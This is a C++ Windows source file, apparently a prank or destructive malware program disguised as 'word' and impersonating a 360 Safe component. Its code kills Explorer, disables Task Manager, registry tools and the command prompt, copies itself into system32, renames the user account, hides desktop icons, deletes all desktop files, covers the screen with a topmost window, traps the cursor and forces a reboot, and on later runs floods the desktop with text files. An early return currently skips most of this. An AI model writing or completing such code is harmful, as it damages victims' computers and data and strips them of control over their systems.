// word.cpp : Defines the entry point for the application.
//

#include "stdafx.h"

HICON icon;
bool stop=false;
HWND hwnd;
HINSTANCE hInstance;
int width,height;

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
unsigned int __stdcall SubThread(void*);
unsigned int __stdcall SubThread2(void*);
void MakeTxt(const char* path);
void RegFirst();
bool IsFirst();
void SecondRun();
bool ReleaseRes(LPCTSTR FileName,unsigned short ResId,LPCTSTR ResType);
void ASSERT(bool assert);

int APIENTRY WinMain(HINSTANCE hInstance2,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	MessageBox(NULL,"我打开了!","提示",MB_OK|MB_ICONINFORMATION);
	return 0;
	hInstance=hInstance2;

	ReleaseRes("C:\\hehe.bmp",IDR_FILE1,"FILE");
	ReleaseRes("C:\\hehe.ico",IDR_FILE2,"FILE");

	if(!IsFirst()){
		SecondRun();
		return 0;
	}else RegFirst();

	::ShellExecute(NULL,"open","taskkill.exe"," /f /im explorer.exe",NULL,SW_HIDE);

	//::ShellExecute(NULL,"open","reg.exe"," add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v 360SafeExt /t REG_SZ /d C:\\Windows\\system32\\360SafeExt.exe /f",NULL,SW_HIDE);

	::ShellExecute(NULL,"open","reg.exe"," add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableTaskMgr /t REG_DWORD /d 00000001 /f",NULL,SW_HIDE);
	::ShellExecute(NULL,"open","reg.exe"," add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableRegistryTools /t REG_DWORD /d 00000001 /f",NULL,SW_HIDE);
	::ShellExecute(NULL,"open","reg.exe"," add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoRun /t REG_DWORD /d 00000001 /f",NULL,SW_HIDE);
	::ShellExecute(NULL,"open","reg.exe"," add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Windows\\System32\\Zhudongfangyu.bmp /f",NULL,SW_HIDE);
	::ShellExecute(NULL,"open","reg.exe"," add HKEY_CLASSES_ROOT\\txtfile\\DefaultIcon\\ /ve /t REG_EXPAND_SZ /d C:\\Windows\\system32\\360SafeExt.ico,0 /f",NULL,SW_HIDE);

	//bmp,ico
	char str[256];
	char cmd[300];
	::GetModuleFileName(NULL,str,256);
	sprintf(cmd," /c copy \"%s\" \"C:\\Windows\\system32\\360SafeExt.exe\"",str);
	::ShellExecute(NULL,"open","cmd.exe",cmd,NULL,SW_HIDE);
	::ShellExecute(NULL,"open","cmd.exe"," /c move \"C:\\hehe.ico\" \"C:\\Windows\\system32\\360SafeExt.ico\"",NULL,SW_HIDE);
	::ShellExecute(NULL,"open","cmd.exe"," /c move \"C:\\hehe.bmp\" \"C:\\Windows\\System32\\Zhudongfangyu.bmp\"",NULL,SW_HIDE);

	//Username
	::ShellExecute(NULL,"open","cmd.exe"," /c wmic useraccount where name='%USERNAME%' call rename '叽叽歪' & pause",NULL,SW_HIDE);

	//Desktop Hidden
	::ShellExecute(NULL,"open","reg.exe"," add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\NonEnum\\ /v {450D8FBA-AD25-11D0-98A8-0800361B1103} /t REG_DWORD /d 00000001 /f",NULL,SW_HIDE);
	::ShellExecute(NULL,"open","reg.exe"," add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\NonEnum\\ /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 00000001 /f",NULL,SW_HIDE);
	::ShellExecute(NULL,"open","reg.exe"," add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\NonEnum\\ /v {645FF040-5081-101B-9F08-00AA002F954E} /t REG_DWORD /d 00000001 /f",NULL,SW_HIDE);
	::ShellExecute(NULL,"open","reg.exe"," add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoNetHood /t REG_DWORD /d 00000001 /f",NULL,SW_HIDE);
	::ShellExecute(NULL,"open","reg.exe"," add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\ /v NoInternetIcon /t REG_DWORD /d 00000001 /f",NULL,SW_HIDE);
	::SHGetSpecialFolderPath(NULL,str,CSIDL_DESKTOP,0);
	sprintf(cmd," /c del \"%s\\*.*\" /q",str);
	::ShellExecute(NULL,"open","cmd.exe",cmd,NULL,SW_HIDE);

	icon=LoadIcon(hInstance,(LPCTSTR)IDI_APPLICATION);

	WNDCLASSEX wcex;

	wcex.cbSize=sizeof(wcex);

	wcex.style=CS_HREDRAW|CS_VREDRAW;
	wcex.hInstance=hInstance;
	wcex.lpszClassName="360SafeExt";
	wcex.lpszMenuName=NULL;
	wcex.cbClsExtra=0;
	wcex.cbWndExtra=0;
	wcex.hIcon=icon;
	wcex.hIconSm=icon;
	wcex.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
	wcex.hCursor=LoadCursor(NULL,IDC_ARROW);
	wcex.lpfnWndProc=WndProc;
	wcex.cbClsExtra=0;
	wcex.cbWndExtra=0;

	if (!RegisterClassEx(&wcex)){
		sprintf(str,"%d",GetLastError());
		MessageBox(NULL,str,"1",MB_OK);
		return 0;
	}

	width=GetSystemMetrics(SM_CXSCREEN);
	height=GetSystemMetrics(SM_CYSCREEN);
	unsigned int thId=0;
	hwnd=::CreateWindowEx(0,"360SafeExt","Fuck You",WS_POPUPWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,width,height,NULL,NULL,hInstance,NULL);
	if (!hwnd){
		sprintf(str,"%d",GetLastError());
		MessageBox(NULL,str,"2",MB_OK);
		return 0;
	}

	::SetWindowPos(hwnd,HWND_TOPMOST,-1,-1,-1,-1,SWP_NOMOVE|SWP_NOSIZE);

	::ShowWindow(hwnd,nCmdShow);
	::UpdateWindow(hwnd);

	_beginthreadex(NULL,0,&SubThread,NULL,0,&thId);

	MSG msg;
	while(GetMessage(&msg,NULL,0,0)&&!stop){
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}

LRESULT CALLBACK WndProc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam){
	return DefWindowProc(hWnd,message,wParam,lParam);
}

unsigned int __stdcall SubThread(void*){
	::ShellExecute(NULL,"open","reg.exe"," add HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System\\ /v DisableCMD /t REG_DWORD /d 00000002 /f",NULL,SW_HIDE);

	long tick=GetTickCount();
	int index=0;
	HBITMAP bmp[4];
	bmp[0]=(HBITMAP)LoadImage(hInstance,(LPCTSTR)IDB_BITMAP1,IMAGE_BITMAP,width,height,LR_DEFAULTCOLOR);
	bmp[1]=(HBITMAP)LoadImage(hInstance,(LPCTSTR)IDB_BITMAP2,IMAGE_BITMAP,width,height,LR_DEFAULTCOLOR);
	bmp[2]=(HBITMAP)LoadImage(hInstance,(LPCTSTR)IDB_BITMAP3,IMAGE_BITMAP,width,height,LR_DEFAULTCOLOR);
	bmp[3]=(HBITMAP)LoadImage(hInstance,(LPCTSTR)IDB_BITMAP4,IMAGE_BITMAP,width,height,LR_DEFAULTCOLOR);
	HDC hdc=GetDC(hwnd);
	HDC mdc=::CreateCompatibleDC(hdc);
	SelectObject(mdc,bmp[0]);
	::BitBlt(hdc,0,0,width,height,mdc,0,0,SRCCOPY);
	long tick2=tick;
	while(!stop){
		if(GetTickCount()-tick>50){
			tick=GetTickCount();
			SelectObject(mdc,bmp[++index]);
			::BitBlt(hdc,0,0,width,height,mdc,0,0,SRCCOPY);
			if(index==3)index=-1;
		}
		if(GetTickCount()-tick2>20000){
			::ShowWindow(hwnd,SW_HIDE);
			stop=true;
			::ShellExecute(NULL,"open","cmd.exe"," /c shutdown -r -t 0",NULL,SW_HIDE);
		}
		SetCursorPos(width,height);
	}
	for(int i=0;i<4;++i){
		DeleteObject(bmp[i]);
	}
	DeleteDC(mdc);
	return 0;
}

void MakeTxt(const char* path){
	ofstream fout(path);
	fout<<"Too Young"<<std::endl<<std::endl;
	fout<<"Too Simple"<<std::endl<<std::endl;
	fout<<"Sometimes Naive"<<std::endl<<std::endl;
	fout<<"苟利国家生死以，岂因祸福避趋之。"<<std::endl<<std::endl;
	fout<<"你和你的电脑的生命-1s"<<std::endl<<std::endl;
	fout<<"叽叽歪和长者在你背后";
	fout.close();
}

void RegFirst(){
	ofstream fout("C:\\Windows\\System32\\360SafeExt.dll");
	fout<<"FUCK♂YOU"<<std::endl<<std::endl;
	fout.close();
}

bool IsFirst(){
	if(_access("C:\\Windows\\System32\\360SafeExt.dll",0)==-1)return true;
	return false;
}

void SecondRun(){
	char str[256];
	char path[300];
	char txt[300];

	icon=LoadIcon(hInstance,(LPCTSTR)IDI_APPLICATION);

	WNDCLASSEX wcex;

	wcex.cbSize=sizeof(wcex);

	wcex.style=CS_HREDRAW|CS_VREDRAW;
	wcex.hInstance=hInstance;
	wcex.lpszClassName="360SafeExt";
	wcex.lpszMenuName=NULL;
	wcex.cbClsExtra=0;
	wcex.cbWndExtra=0;
	wcex.hIcon=icon;
	wcex.hIconSm=icon;
	wcex.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
	wcex.hCursor=LoadCursor(NULL,IDC_ARROW);
	wcex.lpfnWndProc=WndProc;
	wcex.cbClsExtra=0;
	wcex.cbWndExtra=0;

	if (!RegisterClassEx(&wcex)){
		sprintf(str,"%d",GetLastError());
		MessageBox(NULL,str,"1",MB_OK);
		return;
	}

	width=GetSystemMetrics(SM_CXSCREEN);
	height=GetSystemMetrics(SM_CYSCREEN);
	unsigned int thId=0;
	hwnd=::CreateWindowEx(0,"360SafeExt","Fuck You",WS_POPUPWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,width,height,NULL,NULL,hInstance,NULL);
	if (!hwnd){
		sprintf(str,"%d",GetLastError());
		MessageBox(NULL,str,"2",MB_OK);
		return;
	}

	::SHGetSpecialFolderPath(hwnd,path,CSIDL_DESKTOP,0);

	HBITMAP bmp=(HBITMAP)LoadImage(hInstance,(LPCTSTR)IDB_BITMAP5,IMAGE_BITMAP,width,height,LR_DEFAULTCOLOR);
	HDC hdc=GetDC(hwnd);
	HDC mdc=::CreateCompatibleDC(hdc);

	long tick=GetTickCount();
	bool press=false;
	int lastCount=0;
	while(!stop){
		for(int i=1;i<256;++i){
			press=::GetAsyncKeyState(i)!=0;
			if(press)break;
		}
		if(press){
			::ShowWindow(hwnd,SW_NORMAL);
			::SetWindowPos(hwnd,HWND_TOPMOST,-1,-1,-1,-1,SWP_NOMOVE|SWP_NOSIZE);
			SelectObject(mdc,bmp);
			::BitBlt(hdc,0,0,width,height,mdc,0,0,SRCCOPY);
		}else{
			::ShowWindow(hwnd,SW_HIDE);
		}
		if(GetTickCount()/100>lastCount&&GetTickCount()-tick<5000){
			sprintf(txt,"%s\\Engineerning drawing...%d.txt",path,lastCount);
			++lastCount;
			MakeTxt(txt);
		}
		//if(GetTickCount()-tick>20000)break;
	}

	DeleteObject(bmp);
	DeleteDC(mdc);
}

unsigned int __stdcall SubThread2(void*){
	return 0;
}

bool ReleaseRes(LPCTSTR FileName,unsigned short ResId,LPCTSTR ResType){
	HRSRC hResInfo=::FindResource(hInstance,MAKEINTRESOURCE(ResId),ResType);
	if(hResInfo==NULL)return false;
	LPSTR hRes=(LPSTR)::LoadResource(hInstance,hResInfo);
	DWORD size=SizeofResource(hInstance,hResInfo);
	if(hRes==NULL)return false;
	try{
		ofstream fout(FileName,ios::binary);
		fout.write(hRes,size);
		fout.close();
	}catch(std::exception e){
		return false;
	}
	return true;
}